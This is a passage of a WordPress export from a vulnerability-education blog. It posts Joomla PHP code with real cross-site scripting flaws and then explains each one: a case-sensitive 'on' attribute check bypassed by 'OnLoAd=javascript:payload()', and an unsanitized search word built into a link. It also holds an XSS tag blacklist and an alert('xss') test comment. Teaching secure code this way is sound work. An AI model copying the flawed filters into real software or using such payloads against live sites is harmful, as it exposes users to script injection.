		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Madman - File Include]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Madman - File Include]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[File Include Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Time&#039;s Fun</title>
		<link>http://spotthevuln.com/2009/12/times-fun/</link>
		<pubDate>Mon, 28 Dec 2009 16:10:08 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=620</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>Time's fun when you're having fun.

- Kermit the Frog</blockquote>
[ccnLe_php]

var $xssAuto; // default = 1
var $tagBlacklist = array ('applet', 'body', 'bgsound', 'base', 'basefont', 'embed', 'frame', 'frameset', 'head', 'html', 'id', 'iframe', 'ilayer', 'layer', 'link', 'meta', 'name', 'object', 'script', 'style', 'title', 'xml');
var $attrBlacklist = array ('action', 'background', 'codebase', 'dynsrc', 'lowsrc'); // also will strip ALL event handlers

...

/**
* Internal method to strip a tag of certain attributes
*
* @access    protected
* @param    array    $attrSet    Array of attribute pairs to filter
* @return    array    $newSet        Filtered array of attribute pairs
*/
function filterAttr($attrSet)
{
/*
* Initialize variables
*/
$newSet = array ();

/*
* Iterate through attribute pairs
*/
for ($i = 0; $i &lt; count($attrSet); $i ++)
{
/*
* Skip blank spaces
*/
if (!$attrSet[$i])
{
continue;
}

/*
* Split into name/value pairs
*/
$attrSubSet = explode('=', trim($attrSet[$i]), 2);
list ($attrSubSet[0]) = explode(' ', $attrSubSet[0]);

/*
* Remove all "non-regular" attribute names
* AND blacklisted attributes
*/
if ((!eregi("^[a-z]*$", $attrSubSet[0])) || (($this-&gt;xssAuto) &amp;&amp; ((in_array(strtolower($attrSubSet[0]), $this-&gt;attrBlacklist)) || (substr($attrSubSet[0], 0, 2) == 'on'))))
{
continue;
}

/*
* XSS attribute value filtering
*/
if ($attrSubSet[1])
{
// strips unicode, hex, etc
$attrSubSet[1] = str_replace('&amp;#', '', $attrSubSet[1]);
// strip normal newline within attr value
$attrSubSet[1] = preg_replace('/\s+/', '', $attrSubSet[1]);
// strip double quotes
$attrSubSet[1] = str_replace('"', '', $attrSubSet[1]);
// [requested feature] convert single quotes from either side to doubles (Single quotes shouldn't be used to pad attr value)
if ((substr($attrSubSet[1], 0, 1) == "'") &amp;&amp; (substr($attrSubSet[1], (strlen($attrSubSet[1]) - 1), 1) == "'"))
{
$attrSubSet[1] = substr($attrSubSet[1], 1, (strlen($attrSubSet[1]) - 2));
}
// strip slashes
$attrSubSet[1] = stripslashes($attrSubSet[1]);
}

/*
* Autostrip script tags
*/
if (InputFilter :: badAttributeValue($attrSubSet))
{
continue;
}

/*
* Is our attribute in the user input array?
*/
$attrFound = in_array(strtolower($attrSubSet[0]), $this-&gt;attrArray);

/*
* If the tag is allowed lets keep it
*/
if ((!$attrFound &amp;&amp; $this-&gt;attrMethod) || ($attrFound &amp;&amp; !$this-&gt;attrMethod))
{
/*
* Does the attribute have a value?
*/
if ($attrSubSet[1])
{
$newSet[] = $attrSubSet[0].'="'.$attrSubSet[1].'"';
}
elseif ($attrSubSet[1] == "0")
{
/*
* Special Case
* Is the value 0?
*/
$newSet[] = $attrSubSet[0].'="0"';
} else
{
$newSet[] = $attrSubSet[0].'="'.$attrSubSet[0].'"';
}
}
}
return $newSet;
}

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>620</wp:post_id>
		<wp:post_date>2009-12-28 09:10:08</wp:post_date>
		<wp:post_date_gmt>2009-12-28 16:10:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>times-fun</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#code #development]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Time's Fun]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Time's Fun]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/68DClQ]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[03adb8bfe5eae105a28c608691a4ca87]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>361</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Time&#8217;s Fun &#8211; XSS]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/01/times-fun-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-01-01 08:06:58</wp:comment_date>
			<wp:comment_date_gmt>2010-01-01 15:06:58</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Time’s Fun – XSS</title>
		<link>http://spotthevuln.com/2010/01/times-fun-xss/</link>
		<pubDate>Fri, 01 Jan 2010 15:00:23 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=624</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Joomla

Fixed in Version: 1.0.14

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Time's Fun" href="http://spotthevuln.com/2009/12/times-fun/" target="_blank">Found Here</a>
<h2>Description</h2>
<div id="_mcePaste">
<p id="_mcePaste">This is a very subtle bug in Joomla’s XSS filtering.  Joomla establishes a blacklist of HTML tags and attributes that are not allowed.  Blacklists always seem to be the easiest way to go… but rarely do they standup in the long run.  We’ll touch on blacklists in a bit, but for now on to the bug!  In this case, the attacker can provide a HTML tag and a HTML tag attribute (the attribute is optional).  Knowing the dangers of giving users the option to provide arbitrary HTML tags and attributes, the Joomla team devised a blacklist of “bad” HTML tags and attributes.  If the HTML tags and attributes provided by the user happens to match one of the tags or attributes listed in the blacklist, then we enter a failure condition.  Knowing some of the trickery used by  web hackers, the Joomla team first converts the user controlled attribute to lower before checking to see if the provided attribute is in the attribute blacklist.</p>

<blockquote>
<div id="_mcePaste">(in_array(<strong><span style="color: #ff0000;">strtolower</span></strong>($attrSubSet[0]), $this-&gt;attrBlacklist)</div></blockquote>
<p id="_mcePaste">As a “catch all” it seems that the Joomla team wanted to disallow any HTML attributes that began with the letters “on”.  This should prevent an attacker from injecting an attribute such as “onload=javascript:payload()” or “onblur=javascript:payload()”.  This was done by taking a substr() of the provided attribute value and checking to see if the substr() contained the “on” characters.</p>

<blockquote>
<div>(substr($attrSubSet[0], 0, 2) == 'on')</div></blockquote>
<p id="_mcePaste">Unfortunately for the Joomla team HTML (for the most part) supports case insensitivity for HTML attributes.  So while the check would stop an attacker from injecting an onload=javascript:payload() XSS payload, it would allow OnLoAd=javascript:payload().  The Joomla developers fixed this issue by forcing the $attrSubSet[] to lower before doing the comparison.</p>

<blockquote>
<div>(substr(<span style="color: #ff0000;"><strong>strtolower</strong></span>($attrSubSet[0]), 0, 2) == 'on'))))</div></blockquote>
<p id="_mcePaste">Now, onto the blacklist… To put it simply, blacklists are tough.  Even if you somehow manage to get the blacklist correct today, that doesn’t mean someone will change the rules and render your blacklist ineffective tomorrow.  Looking at the blacklist Joomla HTML tag blacklist in this particular code sample, it seems the blacklist is geared towards HTML4.  HTML5 has added new HTML tags which don’t appear to be covered by the blacklist in this example… I wonder if the Joomla devs have updated their blacklist.  Even if the blacklist was updated, it will have to be updated again when new HTML tags are added for the next version of HTML… let’s hope no one forgets :)</p>

</div>
<h2>Developers Solution</h2>
[cce lang="diff"]

var $xssAuto; // default = 1
var $tagBlacklist = array ('applet', 'body', 'bgsound', 'base', 'basefont', 'embed', 'frame', 'frameset', 'head', 'html', 'id', 'iframe', 'ilayer', 'layer', 'link', 'meta', 'name', 'object', 'script', 'style', 'title', 'xml');
var $attrBlacklist = array ('action', 'background', 'codebase', 'dynsrc', 'lowsrc'); // also will strip ALL event handlers

...

/**
* Internal method to strip a tag of certain attributes
*
* @access    protected
* @param    array    $attrSet    Array of attribute pairs to filter
* @return    array    $newSet        Filtered array of attribute pairs
*/
function filterAttr($attrSet)
{
/*
* Initialize variables
*/
$newSet = array ();

/*
* Iterate through attribute pairs
*/
for ($i = 0; $i &lt; count($attrSet); $i ++)
{
/*
* Skip blank spaces
*/
if (!$attrSet[$i])
{
continue;
}

/*
* Split into name/value pairs
*/
$attrSubSet = explode('=', trim($attrSet[$i]), 2);
list ($attrSubSet[0]) = explode(' ', $attrSubSet[0]);

/*
* Remove all "non-regular" attribute names
* AND blacklisted attributes
*/
-if ((!eregi("^[a-z]*$", $attrSubSet[0])) || (($this-&gt;xssAuto) &amp;&amp; ((in_array(strtolower($attrSubSet[0]), $this-&gt;attrBlacklist)) || (substr($attrSubSet[0], 0, 2) == 'on'))))
+if ((!eregi("^[a-z]*$", $attrSubSet[0])) || (($this-&gt;xssAuto) &amp;&amp; ((in_array(strtolower($attrSubSet[0]), $this-&gt;attrBlacklist)) || (substr(strtolower($attrSubSet[0]), 0, 2) == 'on'))))
{
continue;
}

/*
* XSS attribute value filtering
*/
if ($attrSubSet[1])
{
// strips unicode, hex, etc
$attrSubSet[1] = str_replace('&amp;#', '', $attrSubSet[1]);
// strip normal newline within attr value
$attrSubSet[1] = preg_replace('/\s+/', '', $attrSubSet[1]);
// strip double quotes
$attrSubSet[1] = str_replace('"', '', $attrSubSet[1]);
// [requested feature] convert single quotes from either side to doubles (Single quotes shouldn't be used to pad attr value)
if ((substr($attrSubSet[1], 0, 1) == "'") &amp;&amp; (substr($attrSubSet[1], (strlen($attrSubSet[1]) - 1), 1) == "'"))
{
$attrSubSet[1] = substr($attrSubSet[1], 1, (strlen($attrSubSet[1]) - 2));
}
// strip slashes
$attrSubSet[1] = stripslashes($attrSubSet[1]);
}

/*
* Autostrip script tags
*/
if (InputFilter :: badAttributeValue($attrSubSet))
{
continue;
}

/*
* Is our attribute in the user input array?
*/
$attrFound = in_array(strtolower($attrSubSet[0]), $this-&gt;attrArray);

/*
* If the tag is allowed lets keep it
*/
if ((!$attrFound &amp;&amp; $this-&gt;attrMethod) || ($attrFound &amp;&amp; !$this-&gt;attrMethod))
{
/*
* Does the attribute have a value?
*/
if ($attrSubSet[1])
{
$newSet[] = $attrSubSet[0].'="'.$attrSubSet[1].'"';
}
elseif ($attrSubSet[1] == "0")
{
/*
* Special Case
* Is the value 0?
*/
$newSet[] = $attrSubSet[0].'="0"';
} else
{
$newSet[] = $attrSubSet[0].'="'.$attrSubSet[0].'"';
}
}
}
return $newSet;
}

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>624</wp:post_id>
		<wp:post_date>2010-01-01 08:00:23</wp:post_date>
		<wp:post_date_gmt>2010-01-01 15:00:23</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>times-fun-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="joomla"><![CDATA[Joomla]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[83dafcca8ee3ace146cbf04b0a2f02b4]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/6DnsOm]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[XSS in Joomla versions < 1.0.14]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2188</wp:comment_id>
			<wp:comment_author><![CDATA[jlskdgsjd]]></wp:comment_author>
			<wp:comment_author_email>lsklgfd@yahoo.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>117.5.39.186</wp:comment_author_IP>
			<wp:comment_date>2012-03-21 06:38:39</wp:comment_date>
			<wp:comment_date_gmt>2012-03-21 13:38:39</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[alert('xss')]]></wp:comment_content>
			<wp:comment_approved>0</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1332337120.9328";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Keep Carving</title>
		<link>http://spotthevuln.com/2010/01/keepcarving/</link>
		<pubDate>Mon, 04 Jan 2010 15:00:55 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=635</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>I saw the angel in the marble and carved until I set him free.

- Michelangelo</blockquote>
[ccnLe_php]

&lt;?php

function display( &amp;$rows, $params, $pageNav, $limitstart, $limit, $total, $totalRows, $searchword ) {
global $mosConfig_hideCreateDate;
global $mosConfig_live_site, $option, $Itemid;

$c             = count ($rows);
$image         = mosAdminMenus::ImageCheck( 'google.png', '/images/M_images/', NULL, NULL, 'Google', 'Google', 1 );
$searchword = urldecode( $searchword );
$searchword    = htmlspecialchars($searchword, ENT_QUOTES);

// number of matches found
echo '&lt;br/&gt;';
eval ('echo "'._CONCLUSION.'";');

?&gt;
&lt;a href="http://www.google.com/search?q=&lt;?php echo $searchword; ?&gt;" target="_blank"&gt;
&lt;?php echo $image; ?&gt;&lt;/a&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

...

&lt;?php
function conclusion( $searchword, $pageNav ) {
global $mosConfig_live_site, $option, $Itemid;

$ordering         = strtolower( strval( mosGetParam( $_REQUEST, 'ordering', 'newest' ) ) );
$searchphrase     = strtolower( strval( mosGetParam( $_REQUEST, 'searchphrase', 'any' ) ) );

$searchphrase    = htmlspecialchars($searchphrase);

$link             = $mosConfig_live_site ."/index.php?option=$option&amp;Itemid=$Itemid&amp;searchword=$searchword&amp;searchphrase=$searchphrase&amp;ordering=$ordering";
?&gt;
&lt;tr&gt;
&lt;td colspan="3"&gt;
&lt;div align="center"&gt;
&lt;?php echo $pageNav-&gt;writePagesLinks( $link ); ?&gt;
&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;?php
}

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>635</wp:post_id>
		<wp:post_date>2010-01-04 08:00:55</wp:post_date>
		<wp:post_date_gmt>2010-01-04 15:00:55</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>keepcarving</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#code #development]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[89e74920856154c57352e58868d6e8fc]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/5gYGTw]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Keep Carving]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Keep Carving]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>365</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; keep-carving-xss]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/01/keep-carving-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-01-08 08:33:36</wp:comment_date>
			<wp:comment_date_gmt>2010-01-08 15:33:36</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Keep Carving - XSS</title>
		<link>http://spotthevuln.com/2010/01/keep-carving-xss/</link>
		<pubDate>Fri, 08 Jan 2010 15:00:14 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=640</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Joomla

Fixed in Version: 1.x

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Keep Carving" href="http://spotthevuln.com/2010/01/keepcarving/" target="_blank">Found Here</a>
<h2>Description</h2>
This was an XSS bug which affected 1.x versions of Joomla.  Looking at the provided code sample, we see two different functions (function display and function conclusion).  Both functions take various parameters including a parameter named $searchword.  Looking at the function display(), we see a hint that exposes the cross site scripting vulnerability.  Function display() takes the $searchword value, urldecodes the value, then passes the urldecoded value to htmlspecialchars().  This sanitization is conducted in the following lines of code:
<blockquote>$searchword = <a href="http://www.php.net/urldecode">urldecode</a>( <span style="color: #ff0000;">$searchword</span> );
$searchword    = <a href="http://www.php.net/htmlspecialchars">htmlspecialchars</a>(<span style="color: #ff0000;">$searchword</span>, ENT_QUOTES);</blockquote>
Once the $searchword variable has been sanitized, it is ultimately used in creating a link (href) to a Google search query.
<blockquote>&lt;a href="http://www.google.com/search?q=&lt;?php echo <span style="color: #ff0000;">$searchword</span>; ?&gt;</blockquote>
This gives us some indication that values passed as $searchword are likely to be untrusted and could contain bad characters.

Now, if we take a look at the conclusion() function, we see that it also takes a $searchword parameter.  In this case however $searchword is NOT sanitized and is passed to what appears to be a querystring.  Oddly enough, it seems the Joomla developers understood some of the dangers of passing un-sanitized values to a href/link as they were careful to sanitize the $ordering and $searchphrase variables (mosGetParam provides some sanitization against XSS, but we didn’t expect you to know that).  In fact, $searchphrase actually undergoes two rounds of sanitization before being used to build the querystring!  Eventually, the un-sanitized $searchword is used to build a querystring which is assigned to the $link variable.  The $link variable is then used to write a link (href) on the page.  If the $searchword variable had contained quotes, an attacker could easily inject arbitrary HTML attributes into the href, resulting in XSS.

Adding sanitization routines similar to those found in the display() function can help prevent this exposure.

From the code sample provided, we can’t be certain whether the globals $option and $Itemid are sanitized either, it would probably be a good idea for a Joomla dev to check.
<div id="_mcePaste"><!--[if gte mso 9]><xml> <o:OfficeDocumentSettings> <o:AllowPNG /> </o:OfficeDocumentSettings> </xml><![endif]--><!--[if gte mso 9]><xml> <w:WordDocument> <w:View>Normal</w:View> <w:Zoom>0</w:Zoom> <w:TrackMoves /> <w:TrackFormatting /> <w:PunctuationKerning /> <w:ValidateAgainstSchemas /> <w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid> <w:IgnoreMixedContent>false</w:IgnoreMixedContent> <w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText> <w:DoNotPromoteQF /> <w:LidThemeOther>EN-US</w:LidThemeOther> <w:LidThemeAsian>X-NONE</w:LidThemeAsian> <w:LidThemeComplexScript>X-NONE</w:LidThemeComplexScript> <w:Compatibility> <w:BreakWrappedTables /> <w:SnapToGridInCell /> <w:WrapTextWithPunct /> <w:UseAsianBreakRules /> <w:DontGrowAutofit /> <w:SplitPgBreakAndParaMark /> <w:EnableOpenTypeKerning /> <w:DontFlipMirrorIndents /> <w:OverrideTableStyleHps /> </w:Compatibility> <m:mathPr> <m:mathFont m:val="Cambria Math" /> <m:brkBin m:val="before" /> <m:brkBinSub m:val="&#45;-" /> <m:smallFrac m:val="off" /> <m:dispDef /> <m:lMargin m:val="0" /> <m:rMargin m:val="0" /> <m:defJc m:val="centerGroup" /> <m:wrapIndent m:val="1440" /> <m:intLim m:val="subSup" /> <m:naryLim m:val="undOvr" /> </m:mathPr></w:WordDocument> </xml><![endif]--><!--[if gte mso 9]><xml> <w:LatentStyles DefLockedState="false" DefUnhideWhenUsed="true"   DefSemiHidden="true" DefQFormat="false" DefPriority="99"   LatentStyleCount="267"> <w:LsdException Locked="false" Priority="0" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Normal" /> <w:LsdException Locked="false" Priority="9" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="heading 1" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 2" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 3" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 4" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 5" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 6" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 7" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 8" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 9" /> <w:LsdException Locked="false" Priority="39" Name="toc 1" /> <w:LsdException Locked="false" Priority="39" Name="toc 2" /> <w:LsdException Locked="false" Priority="39" Name="toc 3" /> <w:LsdException Locked="false" Priority="39" Name="toc 4" /> <w:LsdException Locked="false" Priority="39" Name="toc 5" /> <w:LsdException Locked="false" Priority="39" Name="toc 6" /> <w:LsdException Locked="false" Priority="39" Name="toc 7" /> <w:LsdException Locked="false" Priority="39" Name="toc 8" /> <w:LsdException Locked="false" Priority="39" Name="toc 9" /> <w:LsdException Locked="false" Priority="35" QFormat="true" Name="caption" /> <w:LsdException Locked="false" Priority="10" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Title" /> <w:LsdException Locked="false" Priority="1" Name="Default Paragraph Font" /> <w:LsdException Locked="false" Priority="11" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Subtitle" /> <w:LsdException Locked="false" Priority="22" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Strong" /> <w:LsdException Locked="false" Priority="20" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Emphasis" /> <w:LsdException Locked="false" Priority="59" SemiHidden="false"    UnhideWhenUsed="false" Name="Table Grid" /> <w:LsdException Locked="false" UnhideWhenUsed="false" Name="Placeholder Text" /> <w:LsdException Locked="false" Priority="1" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="No Spacing" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" 